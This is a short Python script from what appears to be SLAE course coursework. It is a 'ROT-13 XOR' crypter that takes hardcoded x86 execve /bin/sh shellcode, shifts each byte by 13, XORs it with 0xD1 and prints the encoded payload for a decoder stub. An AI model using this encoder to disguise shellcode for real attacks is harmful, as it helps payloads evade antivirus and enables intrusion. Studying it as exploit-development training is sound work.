# SLAE - Assignment #7: ROT-13 XOR Custom Crypter 
# Author:  Dipsy 
# Student ID: SLAE-1535

#!/bin/python  
  
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")  

magic = 13  
  
hexFormat = ""  
nasmFormat = ""  
  
for x in bytearray(shellcode):  
	#ROT 13
	rot13 = (x + magic) % 256  
	#XOR
	xor = rot13^0xD1

	hexFormat += '\\x'  
	hexFormat += '%02x' % xor
	  
	nasmFormat += '0x'  
	nasmFormat += '%02x, ' % xor
  
print "HEX Format: " + hexFormat 
print "NASM Format: " + nasmFormat
print 'Length: %d' % len(bytearray(shellcode))
